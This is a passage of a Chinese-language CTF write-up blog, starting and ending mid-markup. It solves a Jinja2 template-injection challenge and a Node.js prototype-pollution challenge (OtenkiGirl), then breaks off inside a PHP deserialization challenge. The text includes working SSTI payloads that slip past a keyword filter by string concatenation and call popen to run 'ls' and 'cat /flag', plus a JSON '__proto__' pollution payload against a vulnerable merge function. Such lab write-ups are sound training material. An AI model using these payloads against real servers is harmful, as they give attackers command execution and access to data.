expected<br><br><br>--&gt;<br></code></pre></td></tr></table></figure><p>一开始想了挺久不知道为啥出这个页面，后面注意到这里面有个<code>Debug</code>，很明显是我们的输入有问题，尝试访问：<code>/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[%22`就是加号之前的那部分，果然进入了`Debug`界面：![genshin9](img/genshin9.png)`payload`中的`+`被替换成空格了：`/secr3tofpop?name=++1++`![genshin10](img/genshin10.png)![genshin11](img/genshin11.png)这里可以找到部分和`waf`有关的代码，但`waf`具体是什么不知道。其实在`%7b%%20print([].__class__.__base__.__subclasses__())%20%%7D`界面是能搜索到带有`os`的模块的，总不能让我一个一个去数吧。。想了想写出个这个东西：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br>a = <span class="hljs-string">&quot;&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;&quot;</span><br><br><br><span class="hljs-comment"># 使用正则表达式提取类名</span><br>class_names = re.findall(<span class="hljs-string">r&quot;&lt;class &#x27;([^&#x27;]+)&#x27;&quot;</span>, a)<br><br><span class="hljs-comment"># 输出整个数组</span><br><span class="hljs-built_in">print</span>(class_names)<br><br><span class="hljs-comment"># 输出&#x27;int&#x27;所在的位置</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;int 所在的位置:&quot;</span>, class_names.index(<span class="hljs-string">&quot;os._wrap_close&quot;</span>))<br><br><span class="hljs-comment">#132</span><br></code></pre></td></tr></table></figure>带有`Printer`和`Error`的模块没找到，就去找带有`os`的了然后利用`.__init__.__globals__['os']`去访问`os`这个模块以调用函数：`secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[132].__init__.__globals__[%27os%27])%20%&#125;</code></p><p>又触发了过滤。。尝试后发现<code>init</code>这东西不让用(同时过滤大小写)，参考：<code>[SSTI模板注入绕过（进阶篇）_ssti绕过-CSDN博客](https://blog.csdn.net/miuzzx/article/details/110220425)</code></p><p><code>/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[132])%20%&#125;</code></p><p>考虑使用拼接绕过：</p><p><code>/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[132][%22__in%22+%22it__%22][%22__glo%22+%22bals__%22][%22po%22%22pen%22](%22ls%22).read())%20%&#125;</code></p><p><img src="/img/genshin14.png" alt="genshin14"></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/secr3tofpop?name=&#123;%%<span class="hljs-number">20</span><span class="hljs-keyword">print</span>([].__class__.__base__.__subclasses__()[<span class="hljs-number">132</span>][%22__in%22+%22it__%22][%22__glo%22+%22bals__%22][%22po%22%22pen%22](%22cat%20/flag%22).read())%20%&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/genshin13.png" alt="genshin13"></p><p>这题解法一大堆，其它<code>payload</code>可以参考：<code>https://www.cnblogs.com/Article-kelp/p/14797393.html#5228271</code></p><h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>提示：rain… spread… pollute…，初步判断原型链污染</p><p><img src="/img/otengirl1.png" alt="otengirl1"></p><p>下载<code>o.zip</code>附件：</p><p><img src="/img/otengirl2.png" alt="otengirl2"></p><p>。。。。太多了，<code>hint.txt</code>打开发现是段日语：<code>『「routes」フォルダーだけを見てください。SQLインジェクションはありません。』と御坂御坂は期待に満ちた気持ちで言った。</code></p><p>翻译：<code>御坂御坂满怀期待地说道：“请只查看&#39;routes&#39;文件夹。没有SQL注入问题。</code></p><p>那就看看<code>routes</code>:</p><p><img src="/img/otengirl4.png" alt="otengirl4"></p><p>首先是<code>info.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) &#123;<span class="hljs-comment">//getInfo异步函数</span><br>    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<span class="hljs-comment">//检查传入的timestamp参数是否为数字类型，如果不是则将其设置为当前时间戳</span><br>    <span class="hljs-comment">// Remove test data from before the movie was released</span><br>    <span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<span class="hljs-comment">//将min_public_time转换为时间戳，使用应用程序配置中的最小公开时间，如果没有配置，则使用默认配置中的最小公开时间</span><br>    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<span class="hljs-comment">//确保timestamp不会早于minTimestamp</span><br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/info/:ts?&quot;</span>, <span class="hljs-keyword">async</span> (ctx) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span><br>        &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> === <span class="hljs-string">&quot;undefined&quot;</span>) ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-regexp">/^[0-9]+$/</span>.<span class="hljs-title function_">test</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> || <span class="hljs-string">&quot;&quot;</span>) ? <span class="hljs-title class_">Number</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>) : ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> timestamp !== <span class="hljs-string">&quot;number&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter ts&quot;</span><br>        &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getInfo</span>(timestamp).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-attr">data</span>: data<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br><span class="hljs-comment">//主要就是getInfo这个函数，剩下的就是一些返回状态啥的</span><br></code></pre></td></tr></table></figure><p>注意注释：<code>Remove test data from before the movie was released</code>，删除电影发布之前的测试数据。那<code>flag</code>应该和电影发布日期之前的某些数据有关。</p><p><code>submit.js</code>(存在<code>merge</code>函数的部分):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">dst, src</span>) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> dst !== <span class="hljs-string">&quot;object&quot;</span> || <span class="hljs-keyword">typeof</span> src !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> dst;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> src) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> dst &amp;&amp; key <span class="hljs-keyword">in</span> src) &#123;<br>            dst[key] = <span class="hljs-title function_">merge</span>(dst[key], src[key]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            dst[key] = src[key];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dst;<br>&#125;<br><span class="hljs-comment">//以及：</span><br>        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">merge</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<span class="hljs-comment">//注意这里！</span><br></code></pre></td></tr></table></figure><p>其实对原型链污染这东西有点了解就会知道：可以通过<strong>对象merge</strong>或 <strong>对象clone</strong>控制<code>对象.__proto__</code>的值，间接修改继承该原型对象的所有对象，举个简单的栗子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//用于将一个源对象的属性合并到目标对象中</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123; <span class="hljs-comment">//遍历source的所有属性</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<span class="hljs-comment">//对于每个属性，若同时存在于源对象和目标对象中</span><br>            <span class="hljs-title function_">merge</span>(target[key], source[key]) <span class="hljs-comment">//表示这是一个嵌套对象，需要递归调用merge函数，将源对象的嵌套属性合并到目标对象的对应嵌套属性中。</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<span class="hljs-comment">//非嵌套属性，直接将源对象的属性值赋给目标对象的对应属性。</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<span class="hljs-comment">//JSON.parse的存在可以将JSON字符串解析为JavaScript对象，这样一来就存在o2.__protp__.b=2,并把这东西赋值给之前不存在的o1.__proto__</span><br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<span class="hljs-comment">//1 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<span class="hljs-comment">//2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br></code></pre></td></tr></table></figure><p>我们随便添点数据，抓包看一下：</p><p><code>submit</code>这东西就是提交数据，<code>info/时间戳</code>就是加载底下那些愿望标签(看<code>info.js</code>也能知道)</p><p><img src="/img/otengirl3.png" alt="otengirl3"></p><p><img src="/img/otengirl6.png" alt="otengirl6"></p><p>现在有点思路了：根据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<br><br>timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<br></code></pre></td></tr></table></figure><p>我们知道这个<code>timestamp</code>会取<code>timestamp, minTimestamp</code>之间的最大值(保证时间是在电影发布之后)，<code>minTimestamp</code>的话通过创建一个新的Date对象。它首先尝试从<code>CONFIG.min_public_time</code>中获取最小公共时间，如果<code>CONFIG.min_public_time</code>不存在，则使用<code>DEFAULT_CONFIG.min_public_time</code>的值。</p><p>我们去配置文件中找找这个时间是多少：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//config.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>&#125;<br><span class="hljs-comment">//config.default.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-attr">app_name</span>: <span class="hljs-string">&quot;OtenkiGirl&quot;</span>,<br>    <span class="hljs-attr">default_lang</span>: <span class="hljs-string">&quot;ja&quot;</span>,<br>    <span class="hljs-attr">min_public_time</span>: <span class="hljs-string">&quot;2019-07-09&quot;</span>,<br>    <span class="hljs-attr">server_port</span>: <span class="hljs-number">9960</span>,<br>    <span class="hljs-attr">webpack_dev_port</span>: <span class="hljs-number">9970</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>config.js</code>中并不存在<code>min_public_time</code>(但<code>config.default.js</code>中存在，所以后面取得值是<code>config.default.js</code>中的。)那么我们可以通过污染<code>config.js</code>，在这个文件中加入我们想要的<code>min_public_time</code>，然后系统就会忽略<code>config.default.js</code>，让时间足够早。</p><p>那么哪里调用了<code>merge</code>函数呢？<code>const result = await insert2db(merge(DEFAULT, data));</code></p><p>简单说下污染原理：<code>merge(DEFAULT, data)</code>会检查<code>DEFAULT, data</code>里面的键，如果某个键他俩都有，那就递归调用<code>merge</code>函数。如果存在某个键他俩不同时拥有，就令<code>DEFAULT[key] = data[key]</code>。</p><p>如果<code>data</code>对象的原型链上存在名为<code>min_public_time</code>的属性，则该属性将被赋值给<code>DEFAULT</code>对象，那么<code>DEFAULT[key]</code>将会指向原型链上的值。在JavaScript中，对象可以具有特殊的属性__proto__，它指向对象的原型。通过修改<code>data[&#39;__proto__&#39;</code>][‘min_public_time’]的值，我们可以影响原型链上的属性:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json">payload<span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;date&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;place&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;contact&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;reason&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;timestamp&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1700797610124</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span>  <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;min_public_time&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1970-01-01&quot;</span><span class="hljs-punctuation">&#125;</span> <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/otengirl7.png" alt="otengirl7"></p><p>然后刷新一下，会抓到<code>info</code>的包：</p><p><img src="/img/otengirl8.png" alt="otengirl8"></p><p>根据前面的代码我们知道<code>info</code>后面跟的数字就是<code>ts</code>，就是那个<code>min_time</code>后再过多少秒(还是毫秒来着，忘了)。刚设置了<code>1970-01-01</code>，后面随便改个小点的数字就行:</p><p><img src="/img/otengirl9.png" alt="otengirl9"></p><p>拿到<code>flag</code></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span 